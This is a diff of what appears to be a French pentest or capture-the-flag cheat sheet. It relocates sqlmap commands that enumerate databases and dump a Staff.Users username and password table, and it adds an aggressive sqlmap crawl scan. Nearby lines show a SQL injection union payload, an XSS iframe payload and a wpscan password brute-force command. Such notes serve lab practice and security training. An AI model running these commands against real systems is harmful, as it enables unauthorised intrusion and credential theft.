@@ -32,6 +32,14 @@
 	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
 	- Mary' union select 1,2,3,4,5,@@version#
 
+- SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
+	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
+		- sqlmap -r r.txt --batch --dbs
+		- sqlmap -r r.txt --batch -D Staff --tables
+		- sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump
+
+	- sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
@@ -77,12 +85,6 @@ john zip.hashes`
 	- Faire un brute-force sur les mots de passe --> `wpscan --url http://<target-IP>/ --passwords wordlist.txt --usernames victor`
 
 - [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
-
-- SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
-	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
-		- sqlmap -r r.txt --batch --dbs
-		- sqlmap -r r.txt --batch -D Staff --tables
-		- sqlmap -r r.txt --batch -D Staff -T Users -C Username,Password --dump
 
 - WAF --> `wafw00f http://rainbowstore2.chall.malicecyber.com/ `
 
